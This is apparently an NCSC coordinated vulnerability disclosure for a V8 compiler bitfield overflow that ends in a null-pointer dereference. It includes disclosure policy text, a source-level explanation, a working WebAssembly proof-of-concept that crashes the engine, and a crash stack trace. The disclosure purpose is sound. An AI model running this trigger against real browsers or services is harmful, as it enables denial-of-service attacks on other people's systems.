NCSC Contact Information
The vulnerability disclosure mailbox is 'security@ncsc.gov.uk'. Please contact us for our PGP key.

Crediting NCSC
NCSC would appreciate appropriate credit as 'The UK's National Cyber Security Centre (NCSC)' in any advisories which you may publish about this issue. 

Verification, Resolution and Release
Please inform NCSC via the 'security@ncsc.gov.uk' mailbox, quoting the NCSC Reference above, should you:
confirm that this is a security issue
allocate the issue a CVE identifier
determine a date to release a patch
determine a date to publish advisories

NCSC Disclosure Policy
NCSC has adopted the ISO 29147 approach to vulnerability disclosure and, as such, follows a coordinated disclosure approach with affected parties. We have never publicly disclosed a vulnerability prior to a fix being made available. NCSC recognises that vendors need a reasonable amount of time to mitigate a vulnerability, for example, to understand the impact to customers, to triage against other vulnerabilities, to implement a fix in coordination with others, and to make that fix available to its customers. As this will vary based on the exact situation NCSC does not define a set time frame in which a fix must be made available, and we are happy to discuss the circumstances of any particular disclosure. If NCSC believes a vendor is not making appropriate progress with vulnerability resolution, we may, after discussion with the vendor, choose to share the details appropriately (for example, with service providers and our customers) to ensure that we provide appropriate mitigation of the threat to the UK and to UK interests.

Disclaimer
Any NCSC findings and recommendations made have not been provided with the intention of avoiding all risks, and following the recommendations will not remove all such risk. Ownership of information risks remains with the relevant system owner at all times.

Summary
A null pointer dereference has been discovered in V8 compiler which affects the latest version. This vulnerability allows an attacker to bypass a security mitigation.

Details
The V8 compiler produces a node-graph representing Javascript and WASM to be compiled to native code. Several optimisation steps are applied to this graph including dead-code elimination, these require traversing the node-graph and recording the usage of each Node in the graph.

Proof Of Concept
V8 has a structure v8::internal::compiler::Node::Use which is used to record information about a Node being used, as well as the input node that causes that use. The Use structure contains a bit-field that is used to hold multiple pieces of information:
 
struct Use {
    uint32_t bit_field_;
    // ...
    typedef BitField<bool ,0 ,1> InlineField;
    typedef BitField<unsigned ,1 ,17> InputIndexField;  //[1]
    // Leaving some space in the bitset in case we ever decide to record
    // the output index.
};

[1] InputIndexField only provides 16-bits of space to store the index of the input Node of this Use. This effectively limits the the number of inputs Uses. However there does not appear to be any actual code to enforce this limitation, therefore by constructing a graph with a large number of input Nodes to a single Node it is possible to overflow this bitfield.

There is nothing stored above bit 17 in this bitfield, so we do not overflow into anything. However by overflowing we cause the InputIndexField, once decoded to wrap around to zero. 

The following code attempts to use the input_index (loaded from the bitfield) to locate the input Node object. In our case we can cause input_index to be zero. 
 
Node* from() {
    Use* start = this + 1 + input_index();  //[2]
    return is_inline_use() ? reinterpret_cast<Node*>(start)  //[3]                         
    : reinterpret_cast<OutOfLineInputs*>(start)->node_;
}  

For space saving purposes, V8's compiler arranges Node and Use objects in a specific layout as described in this comment:

//============================================================================ //== Memory layout =========================================================== //============================================================================ // Saving space for big graphs is important. We use a memory layout trick to // be able to map {Node} objects to {Use} objects and vice-versa in a // space-efficient manner.
//
// {Use} links are laid out in memory directly before a {Node} ,followed by
// direct pointers to input {Nodes}.
//
// inline case:
// |Use #N  |Use #N-1|...|Use #1  |Use #0  |Node xxxx |I#0|I#1|...|I#N-1|I#N| //          ^                              ^                  ^
//          + Use                          + Node             + Input
//
// Since every {Use} instance records its {input_index} ,pointer arithmetic
// can compute the {Node}.
//
// out-of-line case:
//     |Node xxxx |
//     ^       + outline ------------------+
//     +----------------------------------------+
//                                         |    |
//                                         v    | node
// |Use #N  |Use #N-1|...|Use #1  |Use #0  |OOL xxxxx |I#0|I#1|...|I#N-1|I#N| //          ^                                                 ^
//          + Use                                             + Input
//
// Out-of-line storage of input lists is needed if appending an input to
// a node exceeds the maximum inline capacity.

The code at [2] is trying to access Input Node #N from Use #N by pointer arithmetic. However in our case when we overflow the bitfield this causes input_index to be zero.

[3] Tries to cast the pointer this + 1 (which will actually be Use #N-1) to either a Node or a OutOfLineInputs, causing a type-confusion.

The first kMaxInlineCapacity (14) Nodes are stored with their inputs inline, further nodes are stored with OutOfLineInputs.

This means that at [3] for the first bitfield overflowing Node, the is_inline_use will return false and the Use #N-1 will be incorrectly used as a OutOfLineInputs*. 

The first field of the OutOfLineInputs structure is the node_ field which is returned. This happens to overlap with the Use next field. Unfortunately in our overflow situation this next field is NULL, meaning when the Node returned from from is used, we will get a NULL-pointer dereference crash. 

When the bitfield overflow is triggered, this memory layout of Uses will always been in effect. This means that it is only ever possible to overflow onto the previous Use which will inevitably cause the observed NULL-deref. Therefore NCSC believe that the only result of this vulnerability can be a denial-of-service. 

It may be theoretically possible to hit this bug via jitted JavaScript, however exploitation is significantly easier via WebAssembly, as controlled wasm instructions can be used to force generation of the required Node graph. This code depends on wasm-constants.js and wasm-module-builder.js from the V8 source code. 

let builder = new WasmModuleBuilder();
let body = [];

const NUM_CASES = 0x40000-1;

for (let i=0; i<NUM_CASES; i++) {
    body.push(kExprBlock);
    body.push(kWasmStmt);
}

// Add a BrTable which selects a code block based on arg0
body.push(kExprBlock);
    body.push(kWasmStmt);
    body.push(kExprGetLocal, 0);
    body.push(kExprBrTable, ...varuint32(NUM_CASES));
    for (let i=0; i<NUM_CASES; i++) {
        body.push(...wasmI32Const(i));
    }
    body.push(0); // default case
body.push(kExprEnd);

for (let i=0; i<NUM_CASES; i++) {
    //body.push(...wasmI32Const(i));
    body.push(kExprReturn);
    body.push(kExprEnd); 
}

builder.addFunction('main', kSig_v_i)
    .addBody(body)
    .exportFunc();

let mod = new WebAssembly.Module(builder.toBuffer(true));
let inst = new WebAssembly.Instance(mod, {});
inst.exports.main(0);


Exception Call Stack:
    
    Exception thrown at 0x00007FF6D3B6D6B1 in d8.exe: 0xC0000005: 
    Access violation reading location 0x0000000000000010.
    >   [Inline Frame] d8.exe!v8::internal::compiler::NodeMarker<bool>::Get(const v8::internal::compiler::Node * node) Line 67
        [Inline Frame] d8.exe!v8::internal::compiler::GraphTrimmer::IsLive(v8::internal::compiler::Node * const node) Line 39
        d8.exe!v8::internal::compiler::GraphTrimmer::TrimGraph() Line 35
        [Inline Frame] d8.exe!v8::internal::compiler::LateGraphTrimmingPhase::Run(v8::internal::compiler::PipelineData * data, v8::internal::Zone * temp_zone) Line 1581
        d8.exe!v8::internal::compiler::PipelineImpl::Run<v8::internal::compiler::LateGraphTrimmingPhase>() Line 1085
        [Inline Frame] d8.exe!v8::internal::compiler::PipelineImpl::ComputeScheduledGraph() Line 2245
        d8.exe!v8::internal::compiler::PipelineWasmCompilationJob::ExecuteJobImpl() Line 1034
        d8.exe!v8::internal::OptimizedCompilationJob::ExecuteJob() Line 223
        d8.exe!v8::internal::compiler::TurbofanWasmCompilationUnit::ExecuteCompilation() Line 5148
        d8.exe!v8::internal::wasm::WasmCompilationUnit::ExecuteCompilation() Line 87 


The offending bitfield was added in v8 4.5 and is still present in 7.5. The PoC code uses WebAssembly to access it, this was added later.

Mitigation
Address the bitfield issue to remediate the reported issue.

